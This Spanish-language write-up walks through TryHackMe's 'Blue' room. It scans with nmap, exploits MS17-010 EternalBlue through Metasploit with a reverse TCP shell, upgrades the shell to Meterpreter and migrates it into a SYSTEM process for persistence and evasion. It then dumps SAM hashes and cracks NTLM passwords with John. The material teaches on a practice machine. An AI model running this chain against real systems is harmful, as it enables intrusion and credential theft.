# WriteUp: Blue | TryHackMe

### <mark style="color:yellow;">Introducción</mark>

La máquina **Blue** de [TryHackMe](https://tryhackme.com/room/blue) es un reto de nivel principiante diseñado para introducir al usuario en el uso de herramientas de escaneo y explotación básica. El objetivo principal de este laboratorio es explotar una vulnerabilidad crítica en sistemas Windows: **MS17-010**, comúnmente conocida como **EternalBlue**.

Este WriteUp documenta paso a paso el proceso seguido para identificar y explotar la vulnerabilidad, incorporando también los fundamentos teóricos necesarios para su comprensión. Se detallan las herramientas utilizadas, el razonamiento detrás de cada acción y las lecciones aprendidas a lo largo del ejercicio.

### <mark style="color:yellow;">Metodología de desarrollo</mark>

Antes de comenzar con el reconocimiento activo, es importante adoptar una metodología organizada. Documentar cada hallazgo te permitirá tener un mejor control del análisis y facilitará el seguimiento lógico durante todo el laboratorio.

Te recomiendo mantener un archivo de notas (puede ser un bloc de notas, Obsidian, CherryTree, Notion, etc.) donde registres información clave como:

* IP de la máquina objetivo
* Puertos abiertos y servicios detectados
* Versiones de software en ejecución
* Vulnerabilidades identificadas
* Comandos ejecutados y sus resultados

> 📝 Una buena documentación no solo mejora tu productividad, también te entrena para aplicar buenas prácticas profesionales en entornos reales de pentesting.

### <mark style="color:yellow;">Desarrollo y ANÁLISIS del laboratorio</mark>

Primero debemos de tener en cuenta frases importante que se nos comparte en la descripción del laboratorio:

> Escanee y descubra a qué exploit es vulnerable esta máquina. Tenga en cuenta que esta máquina no responde a pings (ICMP) y puede tardar unos minutos en iniciarse. **Esta sala no está diseñada para ser un CTF de boot2root, sino una serie educativa para principiantes.**

#### <mark style="color:green;">Explicación por partes:</mark>

1. <mark style="color:orange;">**"Escanee y descubra a qué exploit es vulnerable esta máquina."**</mark>

Esto significa que debemos de usar técnicas de **reconocimiento y escaneo de vulnerabilidades** (por ejemplo, con `nmap`) para identificar alguna **vulnerabilidad conocida** en el sistema objetivo. Luego, con base en esa información, buscar un exploit específico que la aproveche.

2. <mark style="color:orange;">**"Tenga en cuenta que esta máquina no responde a pings (ICMP)..."**</mark>

La máquina **no responde a paquetes ping** (ICMP), por lo tanto, comandos como:

```bash
ping <IP>
```

...no funcionarán.

3. <mark style="color:orange;">**"Esta sala no está diseñada para ser un CTF de boot2root..."**</mark>

Un **CTF boot2root** es un reto en el que empiezas con acceso nulo y tu objetivo es llegar a ser `root` (administrador) del sistema. Aquí te dicen que **ese no es el objetivo principal**, sino **entender cómo funciona un exploit específico**.

***

#### Task 1: Recon

<mark style="color:purple;">**1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the**</mark> [<mark style="color:purple;">**Nmap**</mark>](https://tryhackme.com/room/furthernmap) <mark style="color:purple;">**room)**</mark>

> **Traducción de la pregunta:**\
> Escanea la máquina. (Si no estás seguro de cómo hacerlo, te recomiendo revisar la sala de [Nmap](https://tryhackme.com/room/furthernmap)).

***

**Objetivo del escaneo**

Como primer paso, debemos realizar un escaneo a la máquina víctima para identificar posibles **vulnerabilidades** explotables. De acuerdo con el análisis previo del laboratorio, el propósito principal es detectar alguna debilidad específica del sistema, por lo que el escaneo debe estar enfocado en identificar servicios vulnerables.

***

**Comando utilizado**

```bash
sudo nmap -sV -Pn --script=vuln <IP_de_la_máquina_víctima>
```

**Desglose de opciones:**

* **`-Pn`** – _Omitir detección de host_\
  Indica a Nmap que **no realice ping** para verificar si el host está activo. Esto es útil si el firewall de la máquina víctima bloquea respuestas ICMP o si simplemente queremos forzar el escaneo de puertos.
* **`-sV`** – _Detección de versiones de servicios_\
  Permite identificar qué servicios están corriendo en los puertos abiertos, así como sus versiones, lo que es esencial para buscar vulnerabilidades específicas asociadas a esos servicios.
* **`--script=vuln`** – _Ejecución de scripts de vulnerabilidades conocidos_\
  Ejecuta una serie de scripts NSE (Nmap Scripting Engine) que intentan detectar **vulnerabilidades conocidas** en los servicios detectados, como versiones sin parches o configuraciones inseguras.

***

**Resultado esperado**

El escaneo debe proporcionarnos una lista de puertos abiertos, servicios en ejecución y posibles vulnerabilidades asociadas. Esta información será clave para seleccionar un exploit adecuado en la siguiente etapa del laboratorio.

***

<mark style="color:purple;">**2. How many ports are open with a port number under 1000?**</mark>

> **Traducción de la pregunta:**\
> ¿Cuántos puertos están abiertos con un número de puerto menor a 1000?

***

**Objetivo de la pregunta**

El propósito es identificar cuántos puertos abiertos tienen un número inferior a **1000**, es decir, dentro del **rango de puertos conocidos o “well-known ports”** (0–1023). Estos puertos suelen estar asociados a servicios esenciales del sistema.

***

**Análisis del resultado del escaneo Nmap**

Una vez finalizado el escaneo, se presenta la siguiente información:

{% code title="" overflow="wrap" lineNumbers="true" fullWidth="true" %}
```bash
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49158/tcp open  msrpc          Microsoft Windows RPC
49159/tcp open  msrpc          Microsoft Windows RPC
```
{% endcode %}

***

**Filtrado de puertos menores a 1000**

De los puertos listados, los siguientes cumplen la condición:

* **135/tcp**
* **139/tcp**
* **445/tcp**

Esto nos da un **total de 3 puertos abiertos** con número menor a 1000.

***

<mark style="color:purple;">**3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)**</mark>

> **Traducción de la pregunta:**\
> ¿A qué es vulnerable esta máquina? (Respuesta en formato: ms??-???, ej.: ms08-067)

***

**Objetivo de la pregunta**

El propósito es identificar una **vulnerabilidad específica** (normalmente con el formato MSXX-XXX) que afecte a la máquina escaneada. Este tipo de vulnerabilidades suelen ser utilizadas en exploits ampliamente conocidos.

***

**Análisis de la salida del escaneo Nmap**

En la sección correspondiente a los scripts NSE aplicados al servicio SMB, se observa el siguiente resultado:

```bash
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

Esto indica claramente que el sistema es vulnerable a:

* **MS17-010**, una vulnerabilidad crítica de **ejecución remota de código (RCE)** en el protocolo SMBv1 de Windows.

***

**Contexto adicional**

La vulnerabilidad **MS17-010** es famosa por haber sido utilizada por el exploit **EternalBlue**, empleado en ataques como **WannaCry**. Afecta a versiones no parchadas de Windows que usan SMBv1.

**Respuesta final:** ms17-010

***

#### Task 2: Gain Access

<mark style="color:purple;">**1. Start**</mark> [<mark style="color:purple;">**Metasploit**</mark>](https://tryhackme.com/module/metasploit)

> **En español**\
> Inicia Metasploit

* En este caso, para iniciar Metasploit ejecutamos el siguiente comando: `sudo msfconsole`
* Una vez cargado metasploit, nos aparecerá lo siguiente:

***

<mark style="color:purple;">**2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**</mark>

> **Traducción de la pregunta:**\
> Encuentra el código de explotación que ejecutaremos en la máquina. ¿Cuál es la ruta completa del código? (Ej.: exploit/........)

***

**Objetivo de la pregunta**

Esta pregunta busca identificar el **módulo de explotación exacto** que utilizaremos dentro de Metasploit para explotar la vulnerabilidad descubierta en la máquina (MS17-010).

***

**Procedimiento para encontrar el exploit**

1. Abrimos Metasploit y utilizamos el siguiente comando para buscar módulos relacionados con la vulnerabilidad:

```bash
search ms17-010
```

2. La búsqueda arroja múltiples resultados, entre los cuales destacan varios módulos de tipo `exploit`, `auxiliary` y `scanner`.
3. Entre ellos, el más relevante para nuestro caso es:

```bash
exploit/windows/smb/ms17_010_eternalblue
```

Este módulo explota la vulnerabilidad **MS17-010** utilizando el exploit **EternalBlue**, que permite la ejecución remota de código (RCE) en sistemas Windows a través del servicio SMBv1.

***

**¿Por qué elegir este módulo?**

* El escaneo de Nmap reveló que la máquina objetivo es **Windows**.
* El puerto **445 (SMB)** está abierto.
* Se confirmó que la vulnerabilidad presente es **ms17-010**.
* EternalBlue es un exploit probado y efectivo para esta vulnerabilidad en entornos Windows compatibles.

***

**Respuesta final: `exploit/windows/smb/ms17_010_eternalblue`**

***

<mark style="color:purple;">**3. Show options and set the one required value. What is the name of this value? (All caps for submission)**</mark>

> **Traducción de la pregunta:**\
> Mostrar las opciones y establecer el valor requerido. ¿Cómo se llama este valor? (Escribe la respuesta en mayúsculas)

***

**Objetivo de la pregunta**

Identificar cuál es el **valor obligatorio** que debemos configurar para poder ejecutar correctamente el exploit seleccionado en Metasploit.

***

**Procedimiento**

1.  **Seleccionar el módulo de explotación**\
    Una vez identificado el exploit (`exploit/windows/smb/ms17_010_eternalblue`), lo activamos con:

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```

    También se puede usar el índice del módulo (por ejemplo, `use 0`) si fue el primer resultado al buscar con `search`.
2. **Mostrar las opciones de configuración**\
   Ejecutamos:

```bash
show options
```

3. **Analizar los parámetros requeridos**\
   En la tabla de opciones que aparece, se identifican todos los parámetros necesarios para que el módulo funcione correctamente.\
   Entre ellos, se destacan los que tienen el campo `Required` en **"yes"** y aún no tienen un valor asignado.

***

**Parámetro requerido: `RHOSTS`**

* Este valor representa la **IP de la máquina víctima**.
* Debe ser configurado manualmente con el siguiente comando:

```bash
set RHOSTS <IP_de_la_máquina>
```

* Luego puedes verificar que fue asignado correctamente con:

```bash
show options
```

* **Respuesta final:** RHOSTS

***

<mark style="color:purple;">**4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`set payload windows/x64/shell/reverse_tcp`**</mark>

> **Traducción de la pregunta:**\
> Normalmente se podría ejecutar el exploit tal cual, pero con fines de aprendizaje conviene hacer un ajuste antes. Introduce el siguiente comando y presiona Enter:\
> `set payload windows/x64/shell/reverse_tcp`

***

**Objetivo de la pregunta**

El objetivo es **cambiar el payload** que se usará en la explotación. Esto permite experimentar con diferentes tipos de acceso que Metasploit puede generar al comprometer el sistema objetivo.

***

**¿Qué es un payload?**

Un **payload** es el código que se ejecutará en el sistema víctima una vez que la vulnerabilidad haya sido explotada con éxito. Puede ser:

* Una simple shell reversa
* Una sesión Meterpreter
* Un comando específico, entre otros

***

**¿Qué estamos haciendo aquí?**

1.  Por defecto, el módulo de explotación carga el payload:

    ```
    windows/x64/meterpreter/reverse_tcp
    ```
2.  Sin embargo, en este caso, TryHackMe solicita cambiarlo por un payload más simple:

    ```
    windows/x64/shell/reverse_tcp
    ```

    Esto se hace ejecutando el siguiente comando en Metasploit:

    ```bash
    set payload windows/x64/shell/reverse_tcp
    ```
3.  Para verificar que el cambio se aplicó correctamente, puedes volver a usar:

    ```bash
    show options
    ```

    Allí verás que el payload activo ahora es `windows/x64/shell/reverse_tcp`.

***

**Tener en cuenta:**

Este cambio no es obligatorio para ejecutar el exploit, pero permite entender cómo se configura manualmente un payload diferente en Metasploit.

***

<mark style="color:purple;">**5. With that done, run the exploit!**</mark>

> **Traducción de la pregunta:**\
> ¡Una vez hecho esto, ejecuta el exploit!

***

**Objetivo de la pregunta**

El objetivo es lanzar el exploit después de haber configurado correctamente todos los parámetros necesarios, incluyendo el payload y las direcciones IP requeridas.

***

**Ejecución del exploit**

Una vez que ya:

* Has seleccionado el exploit adecuado
* Has configurado `RHOSTS` con la IP de la máquina víctima
* Has cambiado el payload a `windows/x64/shell/reverse_tcp`

Entonces puedes ejecutar el exploit con:

```bash
run
```

o también:

```bash
exploit
```

***

**Consideraciones importantes antes de ejecutar**

🔹 Si estás usando **una máquina externa** (como tu propia Kali Linux):

1. Debes asegurarte de que la máquina pueda comunicarse con la red de TryHackMe (usualmente a través de **OpenVPN** o **WireGuard**).
2.  Para ello, verifica tu interfaz de red con:

    ```bash
    ifconfig
    ```
3. Identifica la interfaz conectada a la VPN (comúnmente `tun0`).
4.  Luego configura `LHOST` con la IP de esa interfaz:

    ```bash
    set LHOST <tu_IP_tun0>
    ```

🔹 Si estás usando el **AttackBox de TryHackMe**:

* No necesitas cambiar el valor de `LHOST`, ya que el entorno ya está configurado automáticamente para funcionar dentro de la red de TryHackMe.

***

<mark style="color:purple;">**6. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.**</mark>

> **Traducción de la pregunta:**\
> Confirma que el exploit se haya ejecutado correctamente. Es posible que tengas que presionar **Enter** para que aparezca el shell de DOS. Luego, envía esta shell a segundo plano con **Ctrl + Z**. Si falla, intenta ejecutar el exploit nuevamente antes de reiniciar la máquina virtual de destino.

***

**Objetivo de la pregunta**

Verificar que la explotación fue exitosa y que se ha obtenido una **shell remota** en el sistema víctima, permitiendo interactuar con él a través de comandos. Luego, se debe **enviar esta shell a segundo plano** para continuar trabajando con Metasploit.

***

**¿Qué sucede si el exploit funciona?**

*   Si el exploit se ejecuta con éxito, verás que Metasploit te muestra un mensaje como:

    ```
    Command shell session 1 opened [...]
    ```
* Si no aparece nada inmediatamente, presiona **Enter** una o dos veces para forzar la aparición del símbolo del sistema (prompt), típico en una shell de DOS (ejemplo: `C:\Windows\System32>`).

***

**Enviar la sesión a segundo plano**

Una vez confirmada la shell, usa la combinación de teclas:

```bash
CTRL + Z
```

Metasploit te preguntará si deseas enviar la sesión al background. Escribe:

```bash
y
```

Y la sesión será almacenada y numerada como activa, permitiendo ejecutar módulos post-explotación.

***

**¿Qué hacer si la explotación falla?**

Si no obtienes shell:

1. Verifica que el **RHOSTS** y el **LHOST** estén correctamente configurados.
2. Intenta ejecutar nuevamente el exploit con `run`.
3. Si sigue sin funcionar, considera **reiniciar la máquina víctima** desde la plataforma y reintentar la explotación.

#### Task 3: Escalate

<mark style="color:purple;">**1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**</mark>

> **En español**\
> Si aún no lo has hecho, activa el shell previamente obtenido (CTRL + Z). Investiga en línea cómo convertir un shell a un shell de meterpreter en Metasploit. ¿Cómo se llama el módulo de publicación que usaremos? (La ruta exacta, similar al exploit que seleccionamos previamente).

Para **convertir una shell básica a una sesión Meterpreter** dentro de Metasploit, se utiliza un módulo _post-explotación_ diseñado específicamente para este propósito.

***

**¿Qué hace este módulo?**

Este módulo **inyecta una carga útil de Meterpreter** en una sesión de shell ya establecida (como la que obtuviste con `windows/x64/shell/reverse_tcp`), permitiéndote aprovechar todas las funcionalidades avanzadas de Meterpreter (como captura de pantalla, keylogging, pivoting, etc.).

***

**Módulo requerido**

El nombre **exacto** del módulo que debes usar es:

```bash
post/multi/manage/shell_to_meterpreter
```

<mark style="color:purple;">**2. Select this (use MODULE\_PATH). Show options, what option are we required to change?**</mark>

> **En español**\
> Seleccione esto (use MODULE\_PATH). Mostrar opciones: ¿qué opción debemos cambiar?

1. Asegúrate de que tienes la sesión activa en background (verificada con `sessions`).
2. Carga el módulo:

```bash
use post/multi/manage/shell_to_meterpreter
```

3. Verifica la configuración con:

```bash
msf6 post(multi/manage/shell_to_meterpreter) > show options 

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

4. **Respuesta:** la opción requerida a modificar es "SESSION"

<mark style="color:purple;">**3. Set the required option, you may need to list all of the sessions to find your target here.**</mark>

> **En español**\
> Establezca la opción requerida, es posible que necesite enumerar todas las sesiones para encontrar su objetivo aquí.

1. Vuelve a verificar la sesión con:

```bash
sessions
```

2. Asigna el ID de la sesión obtenida con el exploit:

```bash
set SESSION <ID>
```

4.  Ejecuta el módulo:

    ```bash
    run
    ```
5. Si es exitoso, verás una nueva sesión Meterpreter activa.
6. Una vez que ya verificaste la nueva sesión, selecciona esa sesión para su uso con:

```bash
sessions <número_de_sesión>
```

***

<mark style="color:purple;">**4. Verify that we have escalated to**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`NT AUTHORITY\SYSTEM`**</mark><mark style="color:purple;">**. Run**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`getsystem`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**to confirm this. Feel free to open a DOS shell via the command**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`shell`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**and run**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`whoami`**</mark><mark style="color:purple;">**. This should return that we are indeed SYSTEM. Background this shell afterwards and select our meterpreter session for usage again.**</mark>

> **Traducción:**\
> Verifique que hayamos escalado privilegios a `NT AUTHORITY\SYSTEM`. Ejecute `getsystem` para confirmarlo. Si desea, abra una consola de DOS con el comando `shell` y ejecute `whoami`. Esto debería confirmar que tenemos privilegios de **SYSTEM**. Luego, regrese la shell al segundo plano y retome el control de la sesión Meterpreter.

***

**Paso 1: Verificación con `getsystem`**

Dentro de la sesión de Meterpreter, ejecutamos:

```bash
meterpreter > getsystem
```

Resultado:

```
[-] Already running as SYSTEM
```

> Este mensaje indica que **ya estamos operando con privilegios de SYSTEM**, por lo que no es necesario realizar una escalada adicional.

***

**Paso 2: Confirmación manual con `whoami`**

Para validarlo, accedimos a una shell del sistema con el comando:

```bash
meterpreter > shell
```

Y ejecutamos:

```bash
C:\Windows\system32> whoami
```

Resultado:

```
nt authority\system
```

> Este resultado **confirma plenamente** que la sesión activa tiene privilegios de `NT AUTHORITY\SYSTEM`.

***

**Paso 3: Enviar la shell al segundo plano**

Se ejecutó:

```bash
^Z
```

Y se aceptó enviar el canal al fondo:

```bash
Background channel 1? [y/N]  y
```

> Esto devuelve el control a la sesión de Meterpreter, lista para ejecutar otras acciones post-explotación.

<mark style="color:purple;">**5. List all of the processes running via the**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`ps`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`NT AUTHORITY\SYSTEM`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**and write down the process ID (far left column).**</mark>

> **Traducción:**\
> Enumere todos los procesos en ejecución con el comando `ps`. El hecho de que seamos SYSTEM no significa que **el proceso actual** desde el que operamos también lo sea. Encuentre un proceso (preferiblemente hacia el final de la lista) que se esté ejecutando como `NT AUTHORITY\SYSTEM` y anote su ID (columna izquierda).

***

**Objetivo**

El objetivo es identificar un **proceso propiedad de SYSTEM** dentro del sistema, que podamos utilizar para migrar nuestra sesión de Meterpreter y así ejecutar futuras acciones de forma más estable o con menos restricciones.

***

**Procedimiento**

1. Desde la sesión de Meterpreter, ejecutamos:

```bash
ps
```

2. Este comando muestra una tabla con los procesos activos en el sistema, incluyendo:
   * PID (Process ID)
   * Nombre del ejecutable
   * Nombre del usuario propietario
3. Buscamos un proceso que:
   * Perteneciente a `NT AUTHORITY\SYSTEM`
   * Preferentemente no sea crítico para el sistema (como `lsass.exe`, que no se recomienda migrar)
   * Aparezca hacia la parte inferior de la lista (suelen ser procesos más recientes o menos esenciales)

***

**Importancia**

Aunque la **sesión** esté en contexto SYSTEM, el proceso desde el que fue lanzado puede no estarlo. Migrar a un proceso legítimo ejecutado por SYSTEM refuerza la persistencia, estabilidad y evasión de defensas.

***

**Acción a seguir**

* Identifica el proceso adecuado y **anota el `PID`**.

Aquí tienes una redacción técnica y estructurada para documentar correctamente la **pregunta 11 del CTF**:

***

<mark style="color:purple;">**6. Migrate to this process using the**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`migrate PROCESS_ID`**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.\*\***</mark>

> **Traducción:**\
> Migre a este proceso utilizando el comando `migrate PROCESS_ID`, donde el ID de proceso es el que anotaste en el paso anterior. Esta operación puede requerir varios intentos, ya que la migración no siempre es estable. Si falla, puede que tengas que repetir la conversión a Meterpreter o reiniciar la máquina víctima. Si ocurre, prueba con un proceso distinto la próxima vez.

***

**Objetivo de la actividad**

El propósito es **migrar la sesión de Meterpreter** a un proceso legítimo que esté ejecutándose con privilegios de `NT AUTHORITY\SYSTEM`. Esto mejora:

* La **estabilidad** de la sesión
* La **persistencia**
* La capacidad de **evadir herramientas de defensa** (EDR, AV)

***

**Procedimiento**

1. Identifica el `PID` del proceso que seleccionaste en el paso anterior (por ejemplo, `1348`).
2.  En la consola de Meterpreter, ejecuta el siguiente comando:

    ```bash
    migrate 1348
    ```
3.  Si la migración es exitosa, verás un mensaje como:

    ```
    [*] Migrating from 1924 to 1348...
    [+] Migration completed successfully.
    ```
4. Si falla, podrías ver mensajes como:

```
[-] Error running command migrate: Rex::Post::Meterpreter::RequestError: Operation failed: Access is denied.
```

***

**Sugerencias en caso de error**

* Prueba con **otro proceso SYSTEM** distinto.
* Evita procesos sensibles como `lsass.exe`, `winlogon.exe` o `csrss.exe` (migrar a estos puede causar inestabilidad o crash del sistema).
* Si ya migraste antes desde una shell, puedes **repetir el proceso de conversión** (`post/multi/manage/shell_to_meterpreter`).
* Como último recurso, **reinicia la máquina víctima** desde la plataforma y repite el proceso desde el principio.

***

**Resultado esperado**

Una vez migrado con éxito, la sesión de Meterpreter estará ejecutándose bajo un proceso del sistema, consolidando así el control total del host comprometido.

***

#### Task 4: Cracking

<mark style="color:purple;">**1. Within our elevated meterpreter shell, run the command**</mark><mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**`hashdump`**</mark><mark style="color:purple;">**. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**</mark>

> **Traducción:**\
> Dentro de nuestra sesión de Meterpreter con privilegios elevados, ejecuta el comando `hashdump`. Este comando volcará todas las contraseñas almacenadas en el sistema, siempre que tengamos los permisos necesarios. ¿Cuál es el nombre del usuario **no predeterminado**?

***

**Objetivo**

El propósito es **identificar un usuario personalizado** creado en la máquina (distinto de los usuarios predeterminados de Windows), mediante el volcado de hashes de contraseñas.

***

**Procedimiento**

1. En tu sesión de Meterpreter, ejecuta:

```bash
hashdump
```

2. El comando devolverá una lista de usuarios con sus respectivos hashes. Por ejemplo:

```bash
Administrator:xxx:xxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxx:::
Guest:xxx:xxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxx:::
john:xxxx:xxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxx:::
```

3. Los usuarios predeterminados de Windows suelen ser:
   * `Administrator`
   * `Guest`
   * (Opcionalmente) `DefaultAccount`, `WDAGUtilityAccount`, etc.
4. Cualquier otro nombre (por ejemplo: `john`, `pedro`, `pepito`, `admin2`, etc.) se considera **no predeterminado**.

<mark style="color:purple;">**2. Copy this password hash to a file and research how to crack it. What is the cracked password?**</mark>

> **En español**\
> Copia este hash de contraseña a un archivo e investiga cómo descifrarlo. ¿Cuál es la contraseña descifrada?

**Crackear un hash NTLM con John the Ripper**

**Paso 1: Crear el archivo de hash**

Crea un archivo llamado `hash.txt` y coloca en él la línea completa del hash encontrado:

```bash
john:xxxx:xxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxx:::
```

Ejemplo usando terminal:

```bash
echo 'john:xxxx:xxxxxxxxxxxxx:xxxxxxxxxxxxxxxx:::' > hash.txt
```

***

**Paso 2: Verificar el formato con John**

John puede detectar el formato automáticamente si el archivo tiene la estructura adecuada (como la que produce `hashdump`).

O puedes especificarlo manualmente con `--format=NT` si quieres forzar que lo tome como hash NTLM:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> **ALERTA**\
> En **Kali Linux**, el archivo `rockyou.txt` **no está listo para usar por defecto** — viene **comprimido** como `rockyou.txt.gz`.

**¿Dónde está ubicado?**

Por defecto, está en:

```
/usr/share/wordlists/rockyou.txt.gz
```

***

**¿Qué hacer?**

Debes **descomprimirlo una vez** antes de poder usarlo con John o Hashcat.

Ejecuta:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

> Esto reemplazará el `.gz` con el archivo descomprimido `rockyou.txt` en la misma ruta.

***

**Resultado**

Después de eso, podrás usarlo directamente con:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

***

**Paso 3: Ver el resultado**

Una vez que John termine de procesar el hash, puedes ver la contraseña crackeada con:

```bash
john --show hash.txt
```

#### Task 5: Find flags!

Encuentra las tres banderas colocadas en esta máquina. No son banderas tradicionales, sino que representan ubicaciones clave dentro del sistema Windows. ¡Usa las pistas a continuación para completar esta sala!

**1. Flag1?&#x20;**_**This flag can be found at the system root.**_

> **En español**\
> Bandera 1: _Esta bandera se encuentra en la raíz del sistema._

***

**¿Qué significa “raíz del sistema” en Windows?**

Se refiere normalmente a:

```
C:\
```

Es decir, el **directorio raíz** del disco donde está instalado el sistema operativo.

***

**¿Qué hacer?**

Desde la **sesión de Meterpreter**, puedes hacer lo siguiente:

**Usando comandos internos de Meterpreter**

```bash
cd C:\
ls
```

Busca archivos con nombres como:

* `flag1.txt`
* `flag.txt`
* `root.txt`
* `FLAG1`, etc.

<mark style="color:purple;">**2. Flag2?**</mark><mark style="color:purple;">**&#x20;**</mark>_<mark style="color:purple;">**This flag can be found at the location where passwords are stored within Windows.**</mark>_<mark style="color:purple;">**&#x20;**</mark><mark style="color:purple;">**\*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.**</mark>

> **En español**\
> Bandera 2: _Esta bandera se encuentra en la ubicación donde se almacenan las contraseñas en Windows._ \*Erratas: A Windows no le gusta la ubicación de esta bandera y, ocasionalmente, puede eliminarla. En algunos casos, puede ser necesario cerrar/reiniciar el equipo y volver a ejecutar el exploit para encontrarla. Si bien esto es relativamente poco frecuente, puede ocurrir.

**¿Dónde guarda Windows las contraseñas?**

Las contraseñas de usuarios locales en Windows se almacenan en el archivo **`SAM` (Security Account Manager)**, ubicado en:

```
C:\Windows\System32\config\SAM
```

Pero **no puede leerse directamente** desde un usuario normal o incluso desde una shell común, ya que está protegido por el sistema.

***

**¿Dónde buscar la bandera?**

`C:\Windows\System32\config\`

* Esta es la carpeta donde está el archivo `SAM`.
* Comando desde Meterpreter:

```bash
cd C:\\Windows\\System32\\config
ls
```

Busca un archivo como `flag2.txt`, `flag.txt`, o similar.

**¿Y si no aparece?**

Si no encuentras el archivo:

* Puede que Windows lo haya eliminado (como advierte el mensaje).
* Reinicia la máquina víctima desde la plataforma.
* Vuelve a ejecutar el exploit y repite la búsqueda.

<mark style="color:purple;">**3. flag3?**</mark><mark style="color:purple;">**&#x20;**</mark>_<mark style="color:purple;">**This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.**</mark>_

> **En español**\
> ¿Bandera 3? _Esta bandera se encuentra en un lugar excelente para saquear. Al fin y al cabo, los administradores suelen tener cosas bastante interesantes guardadas._

**Interpretación de la pista**

El lugar “excelente para saquear” y donde los administradores guardan cosas es típicamente:

```
C:\Users\Administrator\Desktop\
```

o

```
C:\Users\Administrator\Documents\
```

En entornos Windows, es **común colocar flags o archivos de interés** en el escritorio del administrador, especialmente en entornos CTF.

***

**Pasos para encontrar la bandera**

1. Desde **Meterpreter**:

```bash
cd C:\\Users\\Administrator\\Desktop
ls
```

2. Busca un archivo como:

* `flag3.txt`
* `flag.txt`
* `loot.txt`
* etc.

3. Para leerlo:

```bash
cat flag3.txt
```
